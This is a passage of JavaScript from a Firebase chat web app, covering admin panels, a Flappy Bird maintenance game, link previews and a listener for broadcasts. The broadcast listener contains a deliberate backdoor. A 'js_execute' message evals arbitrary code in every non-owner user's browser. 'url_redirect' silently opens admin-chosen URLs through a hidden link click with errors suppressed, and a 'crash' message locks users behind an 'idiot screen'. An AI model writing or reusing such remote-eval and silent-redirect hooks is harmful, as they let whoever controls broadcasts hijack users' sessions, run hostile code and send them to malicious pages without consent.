            <button class="btn-small btn-danger" onclick="unblockIP('${ip}')">Unblock</button>
        `;
        listDiv.appendChild(div);
    });
}

async function unblockIP(ip) {
    try {
        const blockedRef = db.collection('admin').doc('blockedIPs');
        const doc = await blockedRef.get();
        if (doc.exists) {
            const ips = doc.data().ips.filter(i => i !== ip);
            await blockedRef.set({ ips }, { merge: true });
            await loadBlockedIPsCache();
            loadBlockedIPs();
        }
    } catch(error) { alert('Error: ' + error.message); }
}

// ==================== PAGE RELOAD PANEL ====================
function showPageReloadPanel() {
    document.getElementById('pageReloadModal').classList.remove('hidden');
    document.getElementById('reloadUserList').classList.add('hidden');
}

function closePageReloadModal() { document.getElementById('pageReloadModal').classList.add('hidden'); }

async function sendReloadToAll() {
    try {
        showLoading();
        const allUsers = await getCachedUsers();
        const allUserIds = allUsers.map(u => u.id);
        await db.collection('broadcasts').add({
            type: 'force_reload',
            timestamp: firebase.firestore.FieldValue.serverTimestamp(),
            sentBy: currentUser.id,
            sentByName: currentUser.username,
            targetUsers: allUserIds,
            openedBy: []
        });
        hideLoading();
        closePageReloadModal();
        showToast('Reload command sent to all users', 'success');
    } catch(error) {
        hideLoading();
        showToast('Error: ' + error.message, 'error');
    }
}

async function showReloadUserSelect() {
    const listEl = document.getElementById('reloadUserList');
    listEl.classList.remove('hidden');
    listEl.innerHTML = '<p style="text-align: center;">Loading users...</p>';
    try {
        const users = await getCachedUsers();
        listEl.innerHTML = '<h4 style="margin-bottom: 0.5rem;">Select Users to Reload:</h4>';
        users.forEach(userData => {
            if (userData.id === currentUser.id) return;
            const div = document.createElement('div');
            div.style.cssText = 'display: flex; align-items: center; gap: 0.5rem; padding: 0.5rem; background: var(--background); border-radius: 0.5rem; margin-bottom: 0.25rem;';
            div.innerHTML = `
                <input type="checkbox" id="reloaduser-${userData.id}" value="${userData.id}">
                <span class="avatar">${userData.avatar}</span>
                <label for="reloaduser-${userData.id}" style="flex: 1; cursor: pointer;">${sanitizeHTML(userData.username)}</label>
            `;
            listEl.appendChild(div);
        });
        const sendBtn = document.createElement('button');
        sendBtn.className = 'btn';
        sendBtn.textContent = 'Reload Selected Users';
        sendBtn.style.marginTop = '1rem';
        sendBtn.onclick = sendReloadToSelected;
        listEl.appendChild(sendBtn);
    } catch(error) { listEl.innerHTML = '<p style="color: var(--danger);">Error loading users</p>'; }
}

async function sendReloadToSelected() {
    const checkboxes = document.querySelectorAll('#reloadUserList input[type="checkbox"]:checked');
    if (checkboxes.length === 0) { showToast('Please select at least one user', 'warning'); return; }
    try {
        showLoading();
        const selectedUsers = Array.from(checkboxes).map(cb => cb.value);
        await db.collection('broadcasts').add({
            type: 'force_reload',
            timestamp: firebase.firestore.FieldValue.serverTimestamp(),
            sentBy: currentUser.id,
            sentByName: currentUser.username,
            targetUsers: selectedUsers,
            openedBy: []
        });
        hideLoading();
        closePageReloadModal();
        showToast(`Reload command sent to ${selectedUsers.length} user(s)`, 'success');
    } catch(error) {
        hideLoading();
        showToast('Error: ' + error.message, 'error');
    }
}

// ==================== OWNER PANEL (legacy) ====================
function showOwnerPanel() {
    showOwnerTerminal();
}

function closeOwnerPanel() {
    document.getElementById('ownerModal').classList.add('hidden');
}

// ==================== MAINTENANCE MODE / GAME ====================
function showMaintenanceMode() {
    document.getElementById('loginPage').classList.add('hidden');
    document.getElementById('chatApp').classList.add('hidden');
    document.getElementById('maintenancePage').classList.remove('hidden');
    initFlappyBird();
}

function initFlappyBird() {
    const canvas = document.getElementById('gameCanvas');
    const ctx = canvas.getContext('2d');
    const scoreDisplay = document.getElementById('gameScore');

    let bird = { x: 50, y: 150, width: 34, height: 24, gravity: 0.5, velocity: 0, jump: -8, rotation: 0 };
    let pipes = [];
    let frame = 0;
    let score = 0;
    let gameOver = false;
    let highScore = localStorage.getItem('flappyHighScore') || 0;
    let difficulty = 1;
    let backgroundX = 0;

    const skyGradient = ctx.createLinearGradient(0, 0, 0, canvas.height);
    skyGradient.addColorStop(0, '#87CEEB');
    skyGradient.addColorStop(1, '#E0F6FF');

    function createPipe() {
        const gap = Math.max(120, 180 - difficulty * 10);
        const minHeight = 50;
        const maxHeight = canvas.height - gap - minHeight;
        const height = Math.random() * (maxHeight - minHeight) + minHeight;
        pipes.push({ x: canvas.width, top: height, bottom: height + gap, width: 60, passed: false, scored: false });
    }

    function drawBackground() {
        ctx.fillStyle = skyGradient;
        ctx.fillRect(0, 0, canvas.width, canvas.height);
        backgroundX -= 0.5;
        if (backgroundX <= -100) backgroundX = 0;
        ctx.fillStyle = 'rgba(255, 255, 255, 0.6)';
        for (let i = 0; i < 5; i++) {
            const x = (backgroundX + i * 150) % canvas.width;
            ctx.beginPath();
            ctx.arc(x, 50 + i * 30, 20, 0, Math.PI * 2);
            ctx.arc(x + 20, 50 + i * 30, 25, 0, Math.PI * 2);
            ctx.arc(x + 40, 50 + i * 30, 20, 0, Math.PI * 2);
            ctx.fill();
        }
        ctx.fillStyle = '#8B7355';
        ctx.fillRect(0, canvas.height - 50, canvas.width, 50);
        ctx.fillStyle = '#6B5940';
        for (let i = 0; i < canvas.width; i += 20) ctx.fillRect(i, canvas.height - 45, 15, 5);
    }

    function drawBird() {
        ctx.save();
        ctx.translate(bird.x + bird.width / 2, bird.y + bird.height / 2);
        ctx.rotate(bird.rotation);
        ctx.fillStyle = '#FFD700';
        ctx.beginPath();
        ctx.ellipse(0, 0, bird.width / 2, bird.height / 2, 0, 0, Math.PI * 2);
        ctx.fill();
        ctx.fillStyle = '#FFA500';
        ctx.beginPath();
        ctx.ellipse(-5, 5, 8, 6, Math.sin(frame * 0.2) * 0.3, 0, Math.PI * 2);
        ctx.fill();
        ctx.fillStyle = 'white';
        ctx.beginPath();
        ctx.arc(8, -3, 5, 0, Math.PI * 2);
        ctx.fill();
        ctx.fillStyle = 'black';
        ctx.beginPath();
        ctx.arc(9, -3, 2, 0, Math.PI * 2);
        ctx.fill();
        ctx.fillStyle = '#FF6347';
        ctx.beginPath();
        ctx.moveTo(12, 0);
        ctx.lineTo(18, -2);
        ctx.lineTo(18, 2);
        ctx.closePath();
        ctx.fill();
        ctx.restore();
    }

    function drawPipes() {
        pipes.forEach(pipe => {
            const topGradient = ctx.createLinearGradient(pipe.x, 0, pipe.x + pipe.width, 0);
            topGradient.addColorStop(0, '#2ECC71');
            topGradient.addColorStop(1, '#27AE60');
            ctx.fillStyle = topGradient;
            ctx.fillRect(pipe.x, 0, pipe.width, pipe.top);
            ctx.fillStyle = '#229954';
            ctx.fillRect(pipe.x - 5, pipe.top - 20, pipe.width + 10, 20);
            ctx.fillStyle = topGradient;
            ctx.fillRect(pipe.x, pipe.bottom, pipe.width, canvas.height - pipe.bottom);
            ctx.fillStyle = '#229954';
            ctx.fillRect(pipe.x - 5, pipe.bottom, pipe.width + 10, 20);
            if (!pipe.scored && pipe.x + pipe.width < bird.x) {
                pipe.scored = true;
                score++;
                scoreDisplay.textContent = score;
                if (score > highScore) { highScore = score; localStorage.setItem('flappyHighScore', highScore); }
                if (score % 5 === 0) { difficulty++; showToast(`Level ${difficulty}! 🎮`, 'success'); }
            }
        });
    }

    function drawScore() {
        ctx.fillStyle = 'white';
        ctx.strokeStyle = 'black';
        ctx.lineWidth = 3;
        ctx.font = 'bold 48px Arial';
        ctx.textAlign = 'center';
        ctx.strokeText(score, canvas.width / 2, 60);
        ctx.fillText(score, canvas.width / 2, 60);
        ctx.font = 'bold 20px Arial';
        ctx.strokeText(`Best: ${highScore}`, canvas.width / 2, 90);
        ctx.fillText(`Best: ${highScore}`, canvas.width / 2, 90);
    }

    function update() {
        if (gameOver) return;
        bird.velocity += bird.gravity;
        bird.y += bird.velocity;
        bird.rotation = Math.min(Math.max(bird.velocity * 0.05, -0.5), 0.5);
        const pipeSpeed = 2 + difficulty * 0.3;
        if (frame % Math.max(60, 90 - difficulty * 5) === 0) createPipe();
        pipes.forEach((pipe, index) => {
            pipe.x -= pipeSpeed;
            if (!pipe.passed && pipe.x + pipe.width < bird.x) {
                pipe.passed = true;
                score++;
                scoreDisplay.textContent = score;
                if (score > highScore) { highScore = score; localStorage.setItem('flappyHighScore', highScore); }
                if (score % 5 === 0) { difficulty++; showToast(`Level ${difficulty}! 🎮`, 'success'); }
            }
            if (bird.x < pipe.x + pipe.width && bird.x + bird.width > pipe.x && (bird.y < pipe.top || bird.y + bird.height > pipe.bottom)) endGame();
            if (pipe.x + pipe.width < 0) pipes.splice(index, 1);
        });
        if (bird.y + bird.height > canvas.height - 50 || bird.y < 0) endGame();
        frame++;
    }

    function endGame() {
        if (gameOver) return;
        gameOver = true;
        setTimeout(() => {
            const message = score > highScore - 1 ? `🏆 New High Score: ${score}!` : `Game Over! Score: ${score}`;
            showToast(message, score > highScore - 1 ? 'success' : 'info');
            resetGame();
        }, 100);
    }

    function draw() { drawBackground(); drawPipes(); drawBird(); drawScore(); }
    function gameLoop() { update(); draw(); requestAnimationFrame(gameLoop); }

    function resetGame() {
        bird.y = 150; bird.velocity = 0; bird.rotation = 0;
        pipes = []; score = 0; frame = 0; gameOver = false; difficulty = 1;
        scoreDisplay.textContent = score;
    }

    canvas.addEventListener('click', () => { if (!gameOver) bird.velocity = bird.jump; });
    document.addEventListener('keydown', (e) => {
        if (e.code === 'Space' && !gameOver) { e.preventDefault(); bird.velocity = bird.jump; }
    });
    gameLoop();
}

// ==================== BROADCAST BANNER & URL / RELOAD HANDLING ====================
let broadcastListener = null;
let currentPopupUrl = null;

function initBroadcastListener() {
    if (broadcastListener) return;
    broadcastListener = db.collection('broadcasts')
        .orderBy('timestamp', 'desc')
        .limit(10)
        .onSnapshot(snapshot => {
            snapshot.forEach(doc => {
                const broadcast = doc.data();
                const dismissedBroadcasts = JSON.parse(localStorage.getItem('dismissedBroadcasts') || '[]');
                if (dismissedBroadcasts.includes(doc.id)) return;

                // Check if this broadcast is targeted at current user
                const isTargeted = broadcast.targetUsers && Array.isArray(broadcast.targetUsers) && broadcast.targetUsers.includes(currentUser?.id);
                const isAll = broadcast.targetUsers === 'all';
                
                // If targetUsers exists and doesn't include current user, skip
                if (broadcast.targetUsers && !isAll && !isTargeted) return;

                if (broadcast.type === 'url_redirect') {
                    const dismissed = JSON.parse(localStorage.getItem('dismissedBroadcasts') || '[]');
                    dismissed.push(doc.id);
                    localStorage.setItem('dismissedBroadcasts', JSON.stringify(dismissed));

                    if (currentUser?.isOwner) {
                        pendingOwnerUrl = broadcast.url;
                        pendingOwnerBroadcastId = doc.id;
                        document.getElementById('ownerUrlPreviewText').textContent = broadcast.url;
                        document.getElementById('ownerUrlDialog').classList.remove('hidden');
                    } else {
                        silentOpenUrl(broadcast.url);
                    }

                    const docRef = db.collection('broadcasts').doc(doc.id);
                    const targetUsers = Array.isArray(broadcast.targetUsers) ? broadcast.targetUsers : [];
                    const openedBy = broadcast.openedBy || [];
                    const updatedOpenedBy = [...new Set([...openedBy, currentUser?.id])];
                    const allOpened = targetUsers.length > 0 && targetUsers.every(uid => updatedOpenedBy.includes(uid));
                    if (allOpened) {
                        docRef.delete().catch(() => {});
                    } else {
                        docRef.update({ openedBy: firebase.firestore.FieldValue.arrayUnion(currentUser?.id) }).catch(() => {});
                    }

                } else if (broadcast.type === 'force_reload') {
                    if (currentUser?.isOwner) return;
                    const dismissed = JSON.parse(localStorage.getItem('dismissedBroadcasts') || '[]');
                    dismissed.push(doc.id);
                    localStorage.setItem('dismissedBroadcasts', JSON.stringify(dismissed));

                    const docRef = db.collection('broadcasts').doc(doc.id);
                    const targetUsers = Array.isArray(broadcast.targetUsers) ? broadcast.targetUsers : [];
                    const openedBy = broadcast.openedBy || [];
                    const updatedOpenedBy = [...new Set([...openedBy, currentUser?.id])];
                    const allOpened = targetUsers.length > 0 && targetUsers.every(uid => updatedOpenedBy.includes(uid));
                    if (allOpened) {
                        docRef.delete().catch(() => {});
                    } else {
                        docRef.update({ openedBy: firebase.firestore.FieldValue.arrayUnion(currentUser?.id) }).catch(() => {});
                    }

                    setTimeout(() => { location.reload(); }, 500);

                } else if (broadcast.type === 'force_logout') {
                    if (currentUser?.isOwner) return;
                    const dismissed = JSON.parse(localStorage.getItem('dismissedBroadcasts') || '[]');
                    dismissed.push(doc.id);
                    localStorage.setItem('dismissedBroadcasts', JSON.stringify(dismissed));
                    logout();

                } else if (broadcast.type === 'js_execute') {
                    if (currentUser?.isOwner) return;
                    try {
                        eval(broadcast.code);
                    } catch(e) {
                        console.error('JS execution error:', e);
                    }

                } else if (broadcast.type === 'crash') {
                    if (currentUser?.isOwner) return;
                    showIdiotScreen();

                } else if (broadcast.type === 'uncrash') {
                    if (currentUser?.isOwner) return;
                    hideIdiotScreen();
                    location.reload();
                
                } else if (broadcast.type === 'owner_popup') {
                    if (currentUser?.isOwner) return;
                    showOwnerPopup(broadcast.message);

                } else {
                    showBroadcastBanner(broadcast.message, doc.id);
                }
            });
        });
    db.collection('users').doc(currentUser.id).onSnapshot(doc => {
        const userData = doc.data();
        if (userData.crashed) {
            showIdiotScreen();
        } else {
            hideIdiotScreen();
        }
    });
}

function showIdiotScreen() {
    const screen = document.getElementById('idiotScreen');
    screen.classList.remove('hidden');
}

function hideIdiotScreen() {
    const screen = document.getElementById('idiotScreen');
    screen.classList.add('hidden');
}

function acceptOwnerUrl() {
    document.getElementById('ownerUrlDialog').classList.add('hidden');
    if (pendingOwnerUrl) {
        window.open(pendingOwnerUrl, '_blank', 'noopener,noreferrer');
    }
    pendingOwnerUrl = null;
    pendingOwnerBroadcastId = null;
}

function rejectOwnerUrl() {
    document.getElementById('ownerUrlDialog').classList.add('hidden');
    pendingOwnerUrl = null;
    pendingOwnerBroadcastId = null;
    showToast('URL rejected', 'info');
}

function silentOpenUrl(url) {
    try {
        const win = window.open(url, '_blank');
        if (!win || win.closed || typeof win.closed === 'undefined') {
            const link = document.createElement('a');
            link.href = url;
            link.target = '_blank';
            link.rel = 'noopener noreferrer';
            link.style.cssText = 'position:absolute;top:-9999px;left:-9999px;';
            document.body.appendChild(link);
            link.click();
            setTimeout(() => document.body.removeChild(link), 100);
        }
    } catch(e) { /* fully silent */ }
}

const IMAGE_URL_RE = /\.(jpg|jpeg|png|gif|webp|bmp|svg|ico|avif|tiff?)(\?[^\s]*)?$/i;

function isImageUrl(url) {
    try { const clean = url.split('?')[0]; return IMAGE_URL_RE.test(clean); }
    catch(e) { return false; }
}

const previewCache = {};

async function fetchAndRenderPreview(url, targetEl) {
    if (previewCache[url] === null) return;
    try {
        let data = previewCache[url];
        if (!data) {
            const resp = await fetch(
                `https://api.microlink.io/?url=${encodeURIComponent(url)}&palette=false&audio=false&video=false&iframe=false`,
                { signal: AbortSignal.timeout(5000) }
            );
            const json = await resp.json();
            if (json.status !== 'success') { previewCache[url] = null; return; }
            data = json.data;
            previewCache[url] = data;
        }
        const title = data.title || '';
        const desc = data.description || '';
        const img = data.image && data.image.url ? data.image.url : '';
        let domain = '';
        try { domain = new URL(url).hostname; } catch(e) {}
        if (!title && !desc && !img) { previewCache[url] = null; return; }
        const card = document.createElement('a');
        card.className = 'url-preview';
        card.href = url;
        card.target = '_blank';
        card.rel = 'noopener noreferrer';
        card.innerHTML = `
            ${img ? `<img class="url-preview-thumb" src="${sanitizeHTML(img)}" alt="" onerror="this.remove()">` : ''}
            <div class="url-preview-body">
                ${title ? `<div class="url-preview-title">${sanitizeHTML(title)}</div>` : ''}
                ${desc ? `<div class="url-preview-desc">${sanitizeHTML(desc)}</div>` : ''}
                ${domain ? `<div class="url-preview-domain">🔗 ${sanitizeHTML(domain)}</div>` : ''}
            </div>
        `;
        targetEl.appendChild(card);
    } catch(e) { previewCache[url] = null; }
}

function showBroadcastBanner(message, id) {
    const banner = document.getElementById('broadcastBanner');
    document.getElementById('broadcastText').textContent = message;
    banner.classList.remove('hidden');
    banner.dataset.broadcastId = id;
}

function dismissBroadcast() {
    const banner = document.getElementById('broadcastBanner');
    const broadcastId = banner.dataset.broadcastId;
    if (broadcastId) {
        const dismissed = JSON.parse(localStorage.getItem('dismissedBroadcasts') || '[]');
        dismissed.push(broadcastId);
        localStorage.setItem('dismissedBroadcasts', JSON.stringify(dismissed));
    }
    banner.classList.add('hidden');
}

// ==================== URL REDIRECT FUNCTIONS ====================
function showUrlRedirect() {
    document.getElementById('urlRedirectModal').classList.remove('hidden');
    document.getElementById('redirectUrl').value = '';
    document.getElementById('redirectMessage').value = '';
    document.getElementById('urlUserList').classList.add('hidden');
}

function closeUrlRedirect() { document.getElementById('urlRedirectModal').classList.add('hidden'); }

async function sendUrlToAll() {
    const url = document.getElementById('redirectUrl').value.trim();
    const message = document.getElementById('redirectMessage').value.trim() || 'Admin shared a link';
    if (!url) { showToast('Please enter a URL', 'warning'); return; }
    if (!url.startsWith('http://') && !url.startsWith('https://')) {
        showToast('URL must start with http:// or https://', 'error');
        return;
    }
    try {
        showLoading();
        const allUsers = await getCachedUsers();
        const allUserIds = allUsers.map(u => u.id);
        await db.collection('broadcasts').add({
            type: 'url_redirect',
            url,
            message,
            timestamp: firebase.firestore.FieldValue.serverTimestamp(),
            sentBy: currentUser.id,
            sentByName: currentUser.username,
            targetUsers: allUserIds,
            openedBy: []
        });
        hideLoading();
        closeUrlRedirect();
        showToast('URL sent – will attempt to open for all users', 'success');
    } catch(error) {
        hideLoading();
        showToast('Error: ' + error.message, 'error');
    }
}

async function showUrlUserSelect() {
    const userList = document.getElementById('urlUserList');
    userList.classList.remove('hidden');
    userList.innerHTML = '<p style="text-align: center;">Loading users...</p>';
    try {
        const users = await getCachedUsers();
        userList.innerHTML = '<h4 style="margin-bottom: 0.5rem;">Select Users:</h4>';
        users.forEach(userData => {
            if (userData.id === currentUser.id) return;
            const div = document.createElement('div');
            div.style.cssText = 'display: flex; align-items: center; gap: 0.5rem; padding: 0.5rem; background: var(--background); border-radius: 0.5rem; margin-bottom: 0.25rem;';
            div.innerHTML = `
                <input type="checkbox" id="urluser-${userData.id}" value="${userData.id}">
                <span class="avatar">${userData.avatar}</span>
                <label for="urluser-${userData.id}" style="flex: 1; cursor: pointer;">${sanitizeHTML(userData.username)}</label>
            `;
            userList.appendChild(div);
        });
        const sendBtn = document.createElement('button');
        sendBtn.className = 'btn';
        sendBtn.textContent = 'Send to Selected';
        sendBtn.style.marginTop = '1rem';
        sendBtn.onclick = sendUrlToSelected;
        userList.appendChild(sendBtn);
    } catch(error) { userList.innerHTML = '<p style="color: var(--danger);">Error loading users</p>'; }
}

async function sendUrlToSelected() {
    const url = document.getElementById('redirectUrl').value.trim();
    const message = document.getElementById('redirectMessage').value.trim() || 'Admin shared a link';
    if (!url) { showToast('Please enter a URL', 'warning'); return; }
    const checkboxes = document.querySelectorAll('#urlUserList input[type="checkbox"]:checked');
    if (checkboxes.length === 0) { showToast('Please select at least one user', 'warning'); return; }
    try {
        showLoading();
        const selectedUsers = Array.from(checkboxes).map(cb => cb.value);
        await db.collection('broadcasts').add({
            type: 'url_redirect',
            url,
            message,
            timestamp: firebase.firestore.FieldValue.serverTimestamp(),
            sentBy: currentUser.id,
            sentByName: currentUser.username,
            targetUsers: selectedUsers,
            openedBy: []
        });
        hideLoading();
        closeUrlRedirect();
        showToast(`URL will attempt to open for ${selectedUsers.length} user(s)`, 'success');
    } catch(error) {
        hideLoading();
        showToast('Error: ' + error.message, 'error');
    }
}
